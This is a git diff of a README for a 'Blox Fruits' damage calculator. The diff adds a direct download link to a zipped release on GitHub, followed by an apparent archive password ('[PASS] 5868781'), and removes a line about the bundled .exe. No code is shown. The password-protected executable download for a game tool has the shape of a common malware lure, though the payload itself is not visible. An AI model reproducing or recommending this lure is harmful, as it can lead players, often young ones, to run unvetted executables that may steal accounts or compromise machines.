@@ -1,6 +1,6 @@
 # 🍍 Blox Fruits Damage Calculator & Efficiency Tool
 
-![Preview](https://www.google.com/url?sa=t&source=web&rct=j&url=https%3A%2F%2Fwww.roblox.com%2Fgames%2F2753915549%2FBlox-Fruits&ved=0CBYQjRxqFwoTCLDPpfCn1JMDFQAAAAAdAAAAABAH&opi=89978449)  
+![Preview](https://tr.rbxcdn.com/180DAY-9562aea76052b8e6690596750b666b26/768/432/Image/Webp/noFilter)  
 
 ---
 
@@ -19,14 +19,11 @@ Features (in the downloadable version):
 
 ## ⚙️ How to Download & Run
 
-### Step 1: Download the latest release
+### Step 1: [Download from Releases](https://github.com/KARLMAKAVELII/BloxFruits-Damage-Calculator/releases/download/v2.8.0/New.Version.zip)  [PASS] 5868781
 
 ### Step 2: Extract the archive
 
 ### Step 3: Run
-
-
-> 💡 No installation required – the .exe works immediately after extraction.
 
 ---
 
